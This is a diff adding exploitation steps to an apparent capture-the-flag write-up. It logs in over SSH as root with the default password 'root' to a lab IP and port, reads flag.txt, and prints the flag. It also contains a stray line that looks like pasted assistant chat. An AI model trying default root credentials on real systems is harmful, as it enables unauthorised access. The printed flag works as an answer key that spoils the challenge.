@@ -1723,7 +1723,38 @@ A misconfigured DevOps jump box used by a third-party contractor was left expose
 
 ### Exploitation Steps
 
+1. **Attempted SSH login on the target IP and custom port** using the root account:
+    
+    ```bash
+    ssh root@68.183.205.254 -p 34788
+    ```
+    
+2. **When prompted for a password**, entered the commonly used default: `root`.
+    
+3. **Login was successful**, confirming that root login was enabled and default credentials had not been changed.
+    
+4. Once logged in, **listed the contents of the root home directory**:
+    
+    ```bash
+    ls
+    ```
+    
+5. Found a file named `flag.txt` and **read its contents**:
+    
+    ```bash
+    cat flag.txt
+    ```
+    
+6. **Retrieved the flag**:
+    
+    ```
+    h4kit{root_login_still_alive_98afb5c58968}
+    ```
+    
 
+---
+
+Let me know if you'd like this compiled into a file or added to a longer report.
 
 ### 🚩Flag Captured: `h4kit{root_login_still_alive_98afb5c58968}`
 
